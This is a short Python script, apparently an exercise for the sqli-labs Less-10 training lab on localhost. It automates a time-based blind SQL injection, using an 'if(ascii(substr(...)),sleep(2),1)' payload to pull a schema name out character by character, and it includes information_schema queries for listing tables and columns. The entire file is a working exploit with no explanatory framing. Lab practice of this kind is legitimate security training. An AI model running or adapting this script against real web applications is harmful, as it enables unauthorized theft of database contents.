import requests
import time

url='http://127.0.0.1/sqli-labs/Less-10/?id=1'
database='select schema_name from information_schema.schemata'
column='select column_name from information_schema.columns where table_name="table_name"'
table='select table_name from information_schema.tables where table_schema=database()'
result=''
for i in range(1,30):
  for j in range(48,123):
    payload='" and if(ascii(substr(({} limit 0,1),{},1))={},sleep(2),1)--+'.format(database,i,j)
   # print(payload)
    stime=time.time()
    r=requests.get(url+payload)
    etime=time.time()
    if(etime-stime>=2):
      result+=chr(j)
      print(result)
      break